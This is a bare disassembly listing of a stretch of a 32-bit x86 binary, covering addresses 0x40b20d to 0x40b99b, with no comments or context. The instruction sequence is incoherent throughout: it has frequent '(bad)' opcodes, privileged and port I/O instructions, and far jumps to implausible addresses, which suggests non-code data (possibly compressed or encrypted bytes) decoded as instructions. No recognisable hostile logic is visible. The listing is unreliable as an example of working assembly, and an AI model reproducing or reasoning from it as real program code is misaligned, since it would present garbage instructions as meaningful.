  40b20d:	mov    es,WORD PTR [edx-0x31]
  40b210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b211:	ins    DWORD PTR es:[edi],dx
  40b212:	add    ch,BYTE PTR [esp+edx*4]
  40b215:	cdq    
  40b216:	dec    esp
  40b217:	sbb    BYTE PTR [esi+ecx*4-0x6b],ch
  40b21b:	in     eax,dx
  40b21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b21d:	pusha  
  40b21e:	sbb    dl,dh
  40b220:	add    edi,DWORD PTR [eax-0x14f437bb]
  40b226:	and    esi,DWORD PTR [edx-0x346b3c5f]
  40b22c:	stos   DWORD PTR es:[edi],eax
  40b22d:	je     0x40b1c2
  40b22f:	sub    DWORD PTR [esi+esi*4-0x2],eax
  40b233:	nop
  40b234:	cmp    ch,BYTE PTR [edi-0x14c8894c]
  40b23a:	push   esi
  40b23b:	push   edx
  40b23c:	and    BYTE PTR [edi-0x446b6b2e],al
  40b242:	mov    fs,WORD PTR [ecx+eax*8-0x320b0540]
  40b249:	and    DWORD PTR [ecx-0x69],edi
  40b24c:	cs and eax,0x12d6961e
  40b252:	pop    ebp
  40b253:	inc    edi
  40b254:	dec    ebp
  40b255:	push   ds
  40b256:	icebp  
  40b257:	in     al,0xd7
  40b259:	xchg   edi,eax
  40b25a:	adc    eax,0xa1ca663c
  40b25f:	xchg   esp,eax
  40b260:	aas    
  40b261:	(bad)  
  40b262:	mov    ecx,0x98ae3e9a
  40b267:	(bad)  
  40b268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b269:	imul   edx,DWORD PTR ds:0x9826e3aa,0x49
  40b270:	icebp  
  40b271:	add    eax,0xa174fe57
  40b276:	(bad)  
  40b277:	adc    bl,BYTE PTR [ebx]
  40b279:	pop    eax
  40b27a:	dec    esi
  40b27b:	pop    edi
  40b27c:	fidivr DWORD PTR [ecx-0x51]
  40b27f:	cmc    
  40b280:	mov    ah,0x84
  40b282:	jns    0x40b227
  40b284:	rol    BYTE PTR [ebx+0x6e],cl
  40b287:	push   ds
  40b288:	fbstp  TBYTE PTR [edi+0x1e]
  40b28b:	fisubr WORD PTR [edi]
  40b28d:	ja     0x40b255
  40b28f:	mov    BYTE PTR [esi+0x18],bh
  40b292:	mov    dh,0x20
  40b294:	push   cs
  40b295:	mov    dl,0xfe
  40b297:	in     al,0x53
  40b299:	int3   
  40b29a:	outs   dx,BYTE PTR ds:[esi]
  40b29b:	in     al,0xa7
  40b29d:	jae    0x40b230
  40b29f:	stos   BYTE PTR es:[edi],al
  40b2a0:	sub    esi,ebp
  40b2a2:	add    dl,BYTE PTR [ecx]
  40b2a4:	inc    ecx
  40b2a5:	or     eax,0xb4edee95
  40b2aa:	dec    esp
  40b2ab:	mov    dh,0xbf
  40b2ad:	lea    ecx,[ecx-0x40]
  40b2b0:	cli    
  40b2b1:	test   DWORD PTR [ebp+esi*2+0x2e],0x9ce208bd
  40b2b9:	mov    ds:0x66f12f1c,al
  40b2be:	pop    es
  40b2bf:	mov    cl,0x5
  40b2c1:	shl    BYTE PTR [esi+ebx*2],0xa0
  40b2c5:	lock add eax,0xa31886da
  40b2cb:	push   esi
  40b2cc:	jecxz  0x40b31a
  40b2ce:	xor    esi,DWORD PTR [ebx]
  40b2d0:	push   ecx
  40b2d1:	iret   
  40b2d2:	dec    ebp
  40b2d3:	cmp    ch,al
  40b2d5:	test   al,0x62
  40b2d7:	inc    ecx
  40b2d8:	enter  0xa730,0x6b
  40b2dc:	js     0x40b33f
  40b2de:	leave  
  40b2df:	inc    BYTE PTR [ebx+0x4f9257d3]
  40b2e5:	cmp    al,0x75
  40b2e7:	mov    cl,ah
  40b2e9:	fdivr  st(0),st
  40b2eb:	jecxz  0x40b30f
  40b2ed:	inc    edi
  40b2ee:	jne    0x40b304
  40b2f0:	sbb    BYTE PTR [ecx+0x5b],bl
  40b2f3:	jmp    0x5dc2a2f1
  40b2f8:	mov    ebx,0xa0736d61
  40b2fd:	jl     0x40b35b
  40b2ff:	push   edi
  40b300:	mov    esp,DWORD PTR [esp+ebp*1]
  40b303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b304:	inc    ecx
  40b305:	adc    BYTE PTR [ebx+0x49],0xeb
  40b309:	(bad)  
  40b30a:	mov    edx,0x101ed18
  40b30f:	stos   BYTE PTR es:[edi],al
  40b310:	adc    DWORD PTR [ebx+ebp*2+0x1383d95],ebp
  40b317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b318:	imul   BYTE PTR ds:0x9d2ee882
  40b31e:	iret   
  40b31f:	rcr    BYTE PTR [ecx+0x5a248bc0],cl
  40b325:	mov    ebx,0x3af0dc77
  40b32a:	sub    eax,0xcaad02e0
  40b32f:	push   cs
  40b330:	test   al,0x21
  40b332:	imul   esi,DWORD PTR [ebx],0x7f0c129
  40b338:	jle    0x40b3af
  40b33a:	mov    al,ds:0xcb033c8c
  40b33f:	pop    ss
  40b340:	fs pop ecx
  40b342:	dec    eax
  40b343:	test   ebx,eax
  40b345:	xchg   ebx,eax
  40b346:	sar    DWORD PTR [edi-0x56ed9d5c],1
  40b34c:	clc    
  40b34d:	stos   DWORD PTR es:[edi],eax
  40b34e:	sar    DWORD PTR [ebx+0x791005ac],1
  40b354:	jp     0x40b355
  40b356:	pop    es
  40b357:	add    eax,0xcd9862e6
  40b35c:	fdivr  QWORD PTR ds:[edx-0x34]
  40b360:	mov    eax,ds:0x33149340
  40b365:	(bad)  
  40b367:	mov    esp,0x891882df
  40b36c:	lea    ecx,[ecx+0x67]
  40b36f:	mov    ch,0x3e
  40b371:	xlat   BYTE PTR ds:[ebx]
  40b372:	(bad)  
  40b373:	fxam   
  40b375:	retf   
  40b376:	push   edi
  40b377:	stos   BYTE PTR es:[edi],al
  40b378:	and    BYTE PTR [edi],bh
  40b37a:	xor    edi,ebx
  40b37c:	mov    bh,0x29
  40b37e:	imul   edi,DWORD PTR [eax+0x49],0x3cfc112c
  40b385:	push   ss
  40b386:	mov    al,ds:0x813fcc2f
  40b38b:	sbb    BYTE PTR [edx+0x37],dh
  40b38e:	sbb    cl,0xc7
  40b391:	fs cmc 
  40b393:	cmp    bl,BYTE PTR [edi-0xf12f56c]
  40b399:	xchg   DWORD PTR [esi+ecx*1],ebx
  40b39c:	stos   BYTE PTR es:[edi],al
  40b39d:	loop   0x40b33e
  40b39f:	push   ecx
  40b3a0:	push   edi
  40b3a1:	xor    al,0x6c
  40b3a3:	leave  
  40b3a4:	out    dx,eax
  40b3a5:	mov    ebx,DWORD PTR [eax-0x38]
  40b3a8:	and    DWORD PTR [edx],ebp
  40b3aa:	jmp    0x40b3f4
  40b3ac:	inc    esp
  40b3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3ae:	dec    cl
  40b3b0:	xor    edx,ebx
  40b3b2:	add    DWORD PTR [ecx+0x6d],esp
  40b3b5:	in     al,0x5e
  40b3b7:	fst    DWORD PTR [ebp-0x7de9ea7d]
  40b3bd:	mov    ds:0x6daf95a8,eax
  40b3c2:	rcl    edi,0xd0
  40b3c5:	jnp    0x40b417
  40b3c7:	push   0xa5233df7
  40b3cc:	jg     0x40b3b7
  40b3ce:	mov    DWORD PTR [edi*4+0xcebe48e],0x54ba5a6c
  40b3d9:	xor    cl,dl
  40b3db:	lods   al,BYTE PTR ds:[esi]
  40b3dc:	pop    edx
  40b3dd:	ins    DWORD PTR es:[edi],dx
  40b3de:	sub    bh,BYTE PTR [edi-0x7d]
  40b3e1:	ficom  WORD PTR [eax+ecx*1+0x43]
  40b3e5:	popf   
  40b3e6:	repz sahf 
  40b3e8:	clc    
  40b3e9:	ja     0x40b3aa
  40b3eb:	push   ebx
  40b3ec:	mov    bl,0x6d
  40b3ee:	jg     0x40b3e9
  40b3f0:	ret    0xdac
  40b3f3:	mov    ds:0xa8001929,eax
  40b3f8:	(bad)  
  40b3f9:	mov    ?,WORD PTR [edi-0x3be3527e]
  40b3ff:	sbb    eax,0xcdabedaf
  40b404:	mov    ds:0x443a2d24,al
  40b409:	jns    0x40b416
  40b40b:	mov    ecx,0x723fa927
  40b410:	sub    BYTE PTR [edx-0x2eae4050],bl
  40b416:	mov    al,ds:0xfce9ce37
  40b41b:	je     0x40b3fb
  40b41d:	jle    0x40b41c
  40b41f:	pop    esp
  40b420:	add    DWORD PTR [ebx],edx
  40b422:	les    ebx,FWORD PTR [edx-0x5f]
  40b425:	fdiv   QWORD PTR [ebp+ecx*4-0x46]
  40b429:	jns    0x40b429
  40b42b:	stos   DWORD PTR es:[edi],eax
  40b42c:	imul   eax,edi,0xffffff84
  40b42f:	rol    BYTE PTR [eax-0x3152bc48],cl
  40b435:	lahf   
  40b436:	in     al,dx
  40b437:	mov    bl,0xe0
  40b439:	test   eax,0x5cccd595
  40b43e:	jp     0x40b4a6
  40b440:	dec    ebx
  40b441:	fmul   DWORD PTR [ecx+0x1d]
  40b444:	and    DWORD PTR [ebx+0xa],edx
  40b447:	pop    esp
  40b448:	in     eax,0x3d
  40b44a:	mov    DWORD PTR cs:[esi+ebx*8+0x735e3e28],edi
  40b452:	ins    BYTE PTR es:[edi],dx
  40b453:	sbb    cl,dl
  40b455:	rcr    BYTE PTR ss:[edx+0x40],1
  40b459:	arpl   WORD PTR [ebx+edx*1-0x2c5ede69],bx
  40b460:	adc    eax,0x52ecec86
  40b465:	sbb    BYTE PTR [eax],bl
  40b467:	sbb    eax,0x297efd93
  40b46c:	lea    esi,[esi-0x57]
  40b46f:	fs std 
  40b471:	stc    
  40b472:	mov    edi,0xeb8d5c49
  40b477:	outs   dx,BYTE PTR ds:[esi]
  40b478:	xor    dh,bh
  40b47a:	aad    0x2a
  40b47c:	jge    0x40b474
  40b47e:	xchg   ebp,eax
  40b47f:	push   esp
  40b480:	mov    ds:0x3dc24fd2,eax
  40b485:	cmp    BYTE PTR [ebp+0x7f],0x4a
  40b489:	add    ebp,DWORD PTR [ebx-0x11441204]
  40b48f:	inc    esi
  40b490:	mov    ebx,ss
  40b492:	loope  0x40b4a5
  40b494:	adc    dl,bh
  40b496:	nop
  40b497:	pop    es
  40b498:	push   fs
  40b49a:	dec    esp
  40b49b:	mov    cl,0x0
  40b49d:	and    dl,bh
  40b49f:	lock call 0x5e7f:0x859db1ed
  40b4a7:	mov    al,ds:0xe9fc3c2a
  40b4ac:	mov    edx,0x14d4bbfc
  40b4b1:	aaa    
  40b4b2:	inc    ebx
  40b4b3:	aaa    
  40b4b4:	popf   
  40b4b5:	int    0x87
  40b4b7:	push   ebp
  40b4b8:	inc    ebx
  40b4b9:	out    0x5d,al
  40b4bb:	leave  
  40b4bc:	sbb    BYTE PTR ds:0x4eb81dea,0xc6
  40b4c3:	mov    ds:0xb15456dd,eax
  40b4c8:	dec    eax
  40b4c9:	pop    ebx
  40b4ca:	mov    ebp,0xd4a88b1f
  40b4cf:	dec    esp
  40b4d0:	xchg   DWORD PTR [ecx],edi
  40b4d2:	add    BYTE PTR [ebx],0x17
  40b4d5:	pop    ss
  40b4d6:	(bad)  
  40b4d7:	push   esp
  40b4d8:	sub    al,0x30
  40b4da:	mov    bh,0xee
  40b4dc:	adc    dh,BYTE PTR [ebp+eiz*2-0x4739a45a]
  40b4e3:	sub    ch,BYTE PTR [ecx-0xa]
  40b4e6:	les    ebx,FWORD PTR [esi+0x1287619f]
  40b4ec:	and    cl,BYTE PTR [eax-0x1cd51245]
  40b4f2:	mov    ebp,0xab95dd07
  40b4f7:	pop    ebx
  40b4f8:	aad    0x9d
  40b4fa:	and    ebx,DWORD PTR [ebx-0x11]
  40b4fd:	outs   dx,BYTE PTR ds:[esi]
  40b4fe:	fcmovb st,st(0)
  40b500:	cld    
  40b501:	and    BYTE PTR [ebp+0x5b],al
  40b504:	nop
  40b505:	rcr    DWORD PTR [ebx+0xd],0xa4
  40b509:	sub    ebx,DWORD PTR [ebx+0x6b037394]
  40b50f:	pop    DWORD PTR [edx+0x443aba44]
  40b515:	mov    ebx,0xd6199436
  40b51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b51b:	pop    ecx
  40b51c:	jle    0x40b52a
  40b51e:	or     ecx,DWORD PTR [ebx]
  40b520:	add    al,0x9a
  40b522:	mov    ch,0x32
  40b524:	stos   BYTE PTR es:[edi],al
  40b525:	js     0x40b575
  40b527:	int    0x2a
  40b529:	jo     0x40b58b
  40b52b:	ins    DWORD PTR es:[edi],dx
  40b52c:	pop    es
  40b52d:	sub    cl,cl
  40b52f:	jae    0x40b509
  40b531:	push   esp
  40b532:	pop    ds
  40b533:	dec    esp
  40b534:	pop    ebp
  40b535:	mov    edx,esi
  40b537:	shr    DWORD PTR [edx+0x606197eb],1
  40b53d:	ss lahf 
  40b53f:	push   ds
  40b540:	pop    edi
  40b541:	cmp    DWORD PTR [ecx],eax
  40b543:	pop    esi
  40b544:	xchg   ebx,eax
  40b545:	jnp    0x40b577
  40b547:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b549:	shr    BYTE PTR [edx-0x3e7d6bf6],1
  40b54f:	push   cs
  40b550:	sbb    al,0x90
  40b552:	imul   eax,DWORD PTR [edi+0x53],0xbe43a4a8
  40b559:	dec    ebp
  40b55a:	add    DWORD PTR [esp+esi*8],ecx
  40b55d:	push   edx
  40b55e:	sbb    eax,0x8a48729
  40b563:	lock lahf 
  40b565:	push   0x79efafab
  40b56a:	lods   al,BYTE PTR ds:[esi]
  40b56b:	mov    WORD PTR [eiz*4+0x5eca4f5c],ds
  40b572:	es add al,0x4
  40b575:	xchg   esp,eax
  40b576:	das    
  40b577:	fidivr DWORD PTR [ebp-0x36910584]
  40b57d:	fbld   TBYTE PTR [edi-0x412f665f]
  40b583:	retf   
  40b584:	mov    esi,0x7c1df87e
  40b589:	neg    BYTE PTR [edx+0x5ac06db7]
  40b58f:	ins    BYTE PTR es:[edi],dx
  40b590:	scas   al,BYTE PTR es:[edi]
  40b591:	in     eax,0xc0
  40b593:	mov    dh,0xa
  40b595:	out    dx,al
  40b596:	in     eax,0x43
  40b598:	addr16 pop edi
  40b59a:	xchg   esp,eax
  40b59b:	aam    0x4e
  40b59d:	push   0x61
  40b59f:	clc    
  40b5a0:	nop
  40b5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a3:	aaa    
  40b5a4:	push   esi
  40b5a5:	imul   DWORD PTR [ebx]
  40b5a7:	enter  0xcd50,0xf9
  40b5ab:	push   0x4fb96802
  40b5b0:	xor    al,0x61
  40b5b2:	adc    DWORD PTR [ebx+0x392c5b0],esp
  40b5b8:	lds    edx,FWORD PTR [edx]
  40b5ba:	inc    ebp
  40b5bb:	push   0x78a5c6d9
  40b5c0:	cmp    ch,BYTE PTR [ecx-0x38]
  40b5c3:	dec    ebp
  40b5c4:	push   edi
  40b5c5:	loope  0x40b623
  40b5c7:	jb     0x40b5d5
  40b5c9:	push   0x178c6dc8
  40b5ce:	popa   
  40b5cf:	pop    ebp
  40b5d0:	adc    DWORD PTR [edx+0x6761462b],ecx
  40b5d6:	(bad)  
  40b5d7:	stc    
  40b5d8:	cmp    al,0xe2
  40b5da:	test   DWORD PTR [edi-0x72],ecx
  40b5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5de:	das    
  40b5df:	out    0xbb,eax
  40b5e1:	xlat   BYTE PTR ds:[ebx]
  40b5e2:	repnz lods al,BYTE PTR es:[esi]
  40b5e5:	out    0xc9,al
  40b5e7:	ins    DWORD PTR es:[edi],dx
  40b5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e9:	xchg   edx,eax
  40b5ea:	mov    edi,0x8e625e84
  40b5ef:	jge    0x40b631
  40b5f1:	and    al,0x47
  40b5f3:	rol    DWORD PTR [esi-0x72],1
  40b5f6:	and    eax,0x2434f0b1
  40b5fb:	dec    eax
  40b5fc:	mov    al,0xce
  40b5fe:	data16 mov cl,0x56
  40b601:	push   ss
  40b602:	data16 sbb cl,dl
  40b605:	ss inc ebp
  40b607:	aam    0x2f
  40b609:	pusha  
  40b60a:	or     BYTE PTR [edi],ah
  40b60c:	adc    dl,ah
  40b60e:	adc    edi,esi
  40b610:	and    DWORD PTR [ebx-0x3b],esp
  40b613:	sub    eax,0x571c9a52
  40b618:	repz mov bh,0x32
  40b61b:	jne    0x40b62a
  40b61d:	mov    edi,0xd1a243fc
  40b622:	mov    edi,0xec632725
  40b627:	jecxz  0x40b686
  40b629:	das    
  40b62a:	cmp    al,0xe2
  40b62c:	test   al,0xde
  40b62e:	xor    DWORD PTR [esi-0x47876425],0xfffffff4
  40b635:	out    0xd8,al
  40b637:	call   0xdbf8:0x5a89cb78
  40b63e:	sbb    DWORD PTR [esi+0x43e7623d],0x1a
  40b645:	iret   
  40b646:	push   esi
  40b647:	and    eax,0x57acab87
  40b64c:	mov    bh,0xb3
  40b64e:	xchg   ecx,eax
  40b64f:	inc    edi
  40b650:	mov    bh,0xf5
  40b652:	les    edx,FWORD PTR [ebx]
  40b654:	or     ah,BYTE PTR [esi+esi*4-0x33c510a1]
  40b65b:	std    
  40b65c:	and    eax,0xe6c711c5
  40b661:	mov    dl,0x38
  40b663:	and    DWORD PTR ds:0x3af85c5a,0x6a4c4584
  40b66d:	mov    bh,0x6e
  40b66f:	shl    BYTE PTR [esi+0x7580369c],0x8b
  40b676:	rcl    BYTE PTR [ebp+0x244a3b34],cl
  40b67c:	call   DWORD PTR [esi-0x7f44937f]
  40b682:	inc    eax
  40b683:	xchg   edi,eax
  40b684:	push   ecx
  40b685:	hlt    
  40b686:	sbb    al,0x56
  40b688:	cmp    ecx,eax
  40b68a:	jle    0x40b685
  40b68c:	fdiv   DWORD PTR [ebx]
  40b68e:	inc    eax
  40b68f:	mov    esi,DWORD PTR [eax+ebp*8-0x6c3336e7]
  40b696:	mov    eax,ds:0x487892a1
  40b69b:	mov    esi,0x643d85cb
  40b6a0:	push   ebp
  40b6a1:	push   ebp
  40b6a2:	mov    BYTE PTR [edi],dh
  40b6a4:	cwde   
  40b6a5:	cwde   
  40b6a6:	ficom  DWORD PTR [esi-0x3eb32cfa]
  40b6ac:	test   eax,0x63e3809d
  40b6b1:	xchg   edx,eax
  40b6b2:	ins    DWORD PTR es:[edi],dx
  40b6b3:	push   ds
  40b6b4:	xor    bh,BYTE PTR [ebp-0x339707a3]
  40b6ba:	test   BYTE PTR [esi],al
  40b6bc:	cmp    eax,0xc0935ac6
  40b6c1:	pushf  
  40b6c2:	pop    ebp
  40b6c3:	push   esp
  40b6c4:	cmp    cl,BYTE PTR [ebx]
  40b6c6:	daa    
  40b6c7:	daa    
  40b6c8:	and    DWORD PTR [ecx+eax*2+0x4db98d01],ecx
  40b6cf:	cmp    esp,ecx
  40b6d1:	icebp  
  40b6d2:	retf   0xadf7
  40b6d5:	shr    ah,0x3b
  40b6d8:	and    dl,BYTE PTR [ebx]
  40b6da:	push   ebx
  40b6db:	pop    ss
  40b6dc:	aad    0x27
  40b6de:	add    eax,0x434c2518
  40b6e3:	mov    dl,0xd2
  40b6e5:	xchg   esp,eax
  40b6e6:	sub    ah,dh
  40b6e8:	mov    dh,0x41
  40b6ea:	dec    esi
  40b6eb:	popa   
  40b6ec:	push   ds
  40b6ed:	pop    eax
  40b6ee:	adc    eax,0xe1402408
  40b6f3:	je     0x40b6cf
  40b6f5:	repnz or BYTE PTR [esi-0x2a],0xf6
  40b6fa:	push   ds
  40b6fb:	pop    ds
  40b6fc:	sbb    al,0x80
  40b6fe:	sbb    eax,0x5345e493
  40b703:	or     DWORD PTR [ebx],edx
  40b705:	aas    
  40b706:	add    eax,0xf2188d06
  40b70b:	psadbw mm2,QWORD PTR [esi-0x5d3e0cf9]
  40b712:	mov    ch,0x78
  40b714:	jmp    0x3f77969c
  40b719:	push   ds
  40b71a:	and    al,0xa1
  40b71c:	sub    bl,BYTE PTR [edi-0x4e9456b5]
  40b722:	jmp    0x40b768
  40b724:	push   esi
  40b725:	jno    0x40b6be
  40b727:	xor    eax,0x80432f2e
  40b72c:	pop    edx
  40b72d:	ds dec ebp
  40b72f:	dec    edx
  40b730:	rdtsc  
  40b732:	mov    esp,0x56dd7473
  40b737:	mov    ebp,0x9d8d3f04
  40b73c:	or     al,0x7b
  40b73e:	sub    BYTE PTR [esp+ecx*4+0x45],ah
  40b742:	aam    0x26
  40b744:	and    ebx,ebx
  40b746:	daa    
  40b747:	pop    esi
  40b748:	mov    ecx,0xabdc7429
  40b74d:	in     eax,0x5c
  40b74f:	jge    0x40b6f1
  40b751:	xchg   DWORD PTR [esi+eax*1-0x30f6052c],edx
  40b758:	cmp    ebp,esp
  40b75a:	mov    cl,0x11
  40b75c:	mov    ds:0xa8e35254,al
  40b761:	jnp    0x40b75e
  40b763:	(bad)  
  40b764:	fisub  DWORD PTR [eax]
  40b766:	into   
  40b767:	nop
  40b768:	push   esp
  40b769:	and    bh,BYTE PTR [ebx+0xa]
  40b76c:	and    eax,0x617b5d9d
  40b771:	imul   ebx,DWORD PTR [edx+0x69],0x21
  40b775:	adc    BYTE PTR [edi],dh
  40b777:	pop    ss
  40b778:	outs   dx,BYTE PTR ds:[esi]
  40b779:	dec    ebx
  40b77a:	xor    esp,DWORD PTR [eax]
  40b77c:	dec    ebp
  40b77d:	cmp    BYTE PTR [edi+0x14d43515],dh
  40b783:	pusha  
  40b784:	nop
  40b785:	retf   
  40b786:	pop    esi
  40b787:	and    DWORD PTR [ebp+0x7fe3c378],0x1b
  40b78e:	push   0x86d9166a
  40b793:	mov    esp,0x4d097a44
  40b798:	mov    dl,0xa4
  40b79a:	call   0xcc83bc2a
  40b79f:	outs   dx,DWORD PTR ds:[esi]
  40b7a0:	sub    al,0x7a
  40b7a2:	(bad)  
  40b7a3:	out    dx,eax
  40b7a4:	fistp  WORD PTR [edx+0x3a8c9595]
  40b7aa:	aas    
  40b7ab:	sar    BYTE PTR [ebp-0x4dbbb4],1
  40b7b1:	imul   ebx,DWORD PTR [esi-0x4e7565a3],0xffffffe5
  40b7b8:	add    BYTE PTR [edx-0x1e],bh
  40b7bb:	jmp    0x40b7d1
  40b7bd:	hlt    
  40b7be:	cmp    eax,DWORD PTR [eax]
  40b7c0:	int3   
  40b7c1:	jns    0x40b785
  40b7c3:	jnp    0x40b831
  40b7c5:	rcl    DWORD PTR ds:0x1db49632,cl
  40b7cb:	xchg   edi,eax
  40b7cc:	loop   0x40b80d
  40b7ce:	shl    DWORD PTR [ebx+0x4d],cl
  40b7d1:	push   ebp
  40b7d2:	ins    BYTE PTR es:[edi],dx
  40b7d3:	lds    esp,FWORD PTR ds:0x414adc5d
  40b7d9:	mov    DWORD PTR [esi-0x4c818811],eax
  40b7df:	or     eax,0xa9ec88cf
  40b7e4:	mov    dh,0x3f
  40b7e6:	dec    esi
  40b7e7:	push   0xffffff91
  40b7e9:	aaa    
  40b7ea:	leave  
  40b7eb:	xchg   ebp,eax
  40b7ec:	imul   edx,DWORD PTR [edx],0xffffff97
  40b7ef:	rcl    DWORD PTR [eax-0xa],0xc3
  40b7f3:	add    ebp,esp
  40b7f5:	sar    esi,0x3b
  40b7f8:	and    al,0xd0
  40b7fa:	fs jne 0x40b827
  40b7fd:	popw   ss
  40b7ff:	imul   BYTE PTR [ebx]
  40b801:	in     eax,dx
  40b802:	out    dx,al
  40b803:	push   eax
  40b804:	bound  ebp,QWORD PTR ds:0xeb0e9aad
  40b80a:	jb     0x40b875
  40b80c:	div    BYTE PTR [edx-0x6436578c]
  40b812:	test   eax,0xbf5e1e45
  40b817:	mov    al,0x90
  40b819:	test   eax,0x7d1fb31c
  40b81e:	out    dx,eax
  40b81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b820:	push   eax
  40b821:	lea    edx,[eax+0x1d]
  40b824:	push   ebp
  40b825:	ja     0x40b848
  40b827:	ret    0xc080
  40b82a:	cdq    
  40b82b:	cmp    eax,0x7d451bde
  40b830:	dec    ebp
  40b831:	mov    esi,0x59ed3f05
  40b836:	cs sbb ah,ah
  40b839:	imul   esp,DWORD PTR [esi-0xf5f66bc],0x4578d478
  40b843:	add    bl,al
  40b845:	jge    0x40b82e
  40b847:	pop    es
  40b848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b849:	das    
  40b84a:	int3   
  40b84b:	jmp    0x307272c4
  40b850:	(bad)  [ebp-0x60e57ac5]
  40b856:	popf   
  40b857:	outs   dx,BYTE PTR ds:[esi]
  40b858:	in     eax,0x3b
  40b85a:	mov    bl,0x82
  40b85c:	es inc edx
  40b85e:	inc    ebp
  40b85f:	sub    eax,0x2b8e5749
  40b864:	in     eax,dx
  40b865:	mov    DWORD PTR [ebx+0x7d],edx
  40b868:	adc    edi,DWORD PTR [esi-0x43]
  40b86b:	call   0x699c5e79
  40b870:	add    ecx,eax
  40b872:	push   edx
  40b873:	into   
  40b874:	mov    ebx,0xabc777f1
  40b879:	fiadd  DWORD PTR [ecx-0x40]
  40b87c:	(bad)  
  40b87d:	jae    0x40b8df
  40b87f:	(bad)  
  40b880:	shl    ah,1
  40b882:	pop    ss
  40b883:	adc    al,al
  40b885:	xor    eax,0x84563f42
  40b88a:	sub    ebp,DWORD PTR [edi+0x22]
  40b88d:	xor    eax,0xa4904dc0
  40b892:	mov    ch,0xa1
  40b894:	out    0x4d,al
  40b896:	xchg   ebx,eax
  40b897:	pop    esi
  40b898:	mov    ds:0x3b5c185f,al
  40b89d:	jecxz  0x40b82d
  40b89f:	cmc    
  40b8a0:	lea    ecx,[ebx+0xd]
  40b8a3:	xchg   ebx,eax
  40b8a4:	xchg   esi,eax
  40b8a5:	ds and eax,0xfa78487a
  40b8ab:	in     eax,dx
  40b8ac:	inc    ebx
  40b8ad:	mov    fs,WORD PTR [ebp+eiz*1-0x24]
  40b8b1:	dec    esi
  40b8b2:	or     BYTE PTR [ebx-0x24],bl
  40b8b5:	das    
  40b8b6:	addr16 pushf 
  40b8b8:	test   BYTE PTR [esi-0x77d0090d],ch
  40b8be:	or     eax,0xa94906da
  40b8c3:	add    eax,0xb64fe4b3
  40b8c8:	outs   dx,BYTE PTR ds:[esi]
  40b8c9:	mov    BYTE PTR [esi+eax*4],cl
  40b8cc:	jns    0x40b886
  40b8ce:	inc    ebp
  40b8cf:	pop    esi
  40b8d0:	jbe    0x40b87d
  40b8d2:	retf   
  40b8d3:	js     0x40b8db
  40b8d5:	jmp    0x60f2e6cf
  40b8da:	cmp    BYTE PTR [ebp-0x766308eb],0x42
  40b8e1:	mov    dl,0xd8
  40b8e3:	push   esi
  40b8e4:	sub    ch,bl
  40b8e6:	adc    BYTE PTR [ecx+eax*1+0x3d0ebc81],al
  40b8ed:	sbb    eax,0x5f05cacd
  40b8f2:	ins    DWORD PTR es:[edi],dx
  40b8f3:	inc    eax
  40b8f4:	scas   eax,DWORD PTR es:[edi]
  40b8f5:	std    
  40b8f6:	clc    
  40b8f7:	out    0x19,eax
  40b8f9:	xchg   ebp,eax
  40b8fa:	cmp    al,0x88
  40b8fc:	stos   BYTE PTR es:[edi],al
  40b8fd:	xchg   esp,eax
  40b8fe:	mov    al,0x51
  40b900:	mov    edx,0xa0ace902
  40b906:	inc    edi
  40b907:	xchg   esi,eax
  40b908:	xchg   ebx,eax
  40b909:	sub    ebp,DWORD PTR ds:0x7a4e66f2
  40b90f:	in     eax,0x1e
  40b911:	mov    ds:0x6b637d93,eax
  40b916:	push   eax
  40b917:	lmsw   WORD PTR [eax+0x43ebf2d7]
  40b91e:	(bad)  
  40b91f:	adc    BYTE PTR [edi],ch
  40b921:	pushf  
  40b922:	pop    eax
  40b923:	dec    ecx
  40b924:	xchg   ecx,eax
  40b925:	cwde   
  40b926:	aas    
  40b927:	je     0x40b94c
  40b929:	ins    DWORD PTR es:[edi],dx
  40b92a:	scas   al,BYTE PTR es:[edi]
  40b92b:	sub    BYTE PTR [ebp-0x78],0x8e
  40b92f:	mov    DWORD PTR ss:[ecx],esi
  40b932:	lds    ecx,FWORD PTR [ebx-0xb]
  40b935:	xchg   ebp,eax
  40b936:	inc    eax
  40b937:	xor    dh,BYTE PTR [edi+0x43563b46]
  40b93d:	out    dx,eax
  40b93e:	imul   ecx,DWORD PTR [edi+eiz*1+0x57],0x883849d1
  40b946:	and    al,BYTE PTR ds:0xab4958e9
  40b94c:	std    
  40b94d:	jne    0x40b96f
  40b94f:	mov    ah,0x17
  40b951:	jmp    0xd935:0x92c9c6ad
  40b958:	aaa    
  40b959:	icebp  
  40b95a:	pop    ss
  40b95b:	(bad)  
  40b95c:	loopne 0x40b91b
  40b95e:	addr16 push ds
  40b960:	xor    BYTE PTR [edx+0x44216fb0],cl
  40b966:	sbb    BYTE PTR [di-0x9e7],dl
  40b96b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96c:	rcr    cl,cl
  40b96e:	mov    dh,0xaa
  40b970:	xchg   edi,eax
  40b971:	repz pop ecx
  40b973:	sub    dl,BYTE PTR [esi-0x2638cf87]
  40b979:	jmp    ebx
  40b97b:	xor    edi,ebp
  40b97d:	pop    ds
  40b97e:	xor    BYTE PTR [edi],ah
  40b980:	fmul   DWORD PTR [esi+0x5430542f]
  40b986:	outs   dx,DWORD PTR ds:[esi]
  40b987:	leave  
  40b988:	popf   
  40b989:	fdivrp st(7),st
  40b98b:	mov    ah,BYTE PTR [ebx]
  40b98d:	in     eax,0xfa
  40b98f:	pop    edi
  40b990:	add    DWORD PTR [ecx+0xf],ebp
  40b993:	adc    ebp,DWORD PTR [ebx-0x101e31af]
  40b999:	aas    
  40b99a:	push   ecx
  40b99b:	popf   
